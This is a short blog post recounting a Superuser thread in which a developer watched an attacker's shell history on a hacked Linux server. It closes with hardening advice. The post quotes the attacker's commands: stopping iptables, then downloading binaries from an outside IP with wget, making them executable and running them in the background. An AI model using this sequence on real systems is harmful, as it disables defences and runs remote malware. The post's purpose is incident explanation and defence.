---
layout: post
title:  "Live Hacking attempt thread in StackOverflow"
summary: "Tường thuật trực tiếp diễn biến các thông tin và thao tác mà hacker dùng trên chính 1 server bị hacked."
tags: Tech Security
---
> * Thread "Did I just get hacked?": [https://superuser.com/questions/1034137/did-i-just-get-hacked](https://superuser.com/questions/1034137/did-i-just-get-hacked) 
> * Texts from TheNextWeb: http://thenextweb.com/dd/2016/02/10/developer-watches-as-hackers-break-into-a-server/

Usually network infrastructure teams try to piece together how they were hacked, but one developer over on Superuser found themselves the audience to exactly how a major hack on their infrastructure unfolded.

User Vaid asked on Superuser if their server was compromised after walking away for an hour break and coming back to hundreds of commands written in the terminal window — it turns out that the server was indeed hacked:
```
  355  service iptables stop
  356  cd /tmp
  357  wget http://222.186.30.209:65534/yjz1
  358  chmod 0755 /tmp/yjz1
  359  nohup /tmp/yjz1 > /dev/null 2>&1 &
  360  chmod 777 yjz1
  361  ./yjz1
  362  chmod 0755 /tmp/yjz1
  363  nohup /tmp/yjz1 > /dev/null 2>&1 &
  364  chmod 0777 yjz1
  365  chmod u+x yjz1
  366  ./yjz1 &
  367  chmod u+x yjz1
  368  ./yjz1 &
  369  wget http://222.186.30.209:65534/yjz
  370  chmod 0755 /tmp/yjz
  371  nohup /tmp/yjz > /dev/null 2>&1 &
```
There were hundreds of these types of commands in the terminal, which may look like gibberish if you’re not familiar with Linux. In brief, the attackers broke into the server, stopped the firewall and proceeded to download and execute malicious code repeatedly.

If there’s two big takeaways from the post, it’s these:

1. Use private key authentication on your Linux servers to avoid brute-force attacks
2. Once a server like this is compromised, it needs to be destroyed

The post is a fascinating and somewhat rare look at how an attack on an innocent Web server can unfold when it’s not secured properly — you can see how the attacker broke in, tinkered with the system and tried to deploy multiple pieces of malware.

Remember, when you put your server online for the world to see it can and will be attacked, so it’s important to secure your internet-facing machines properly.
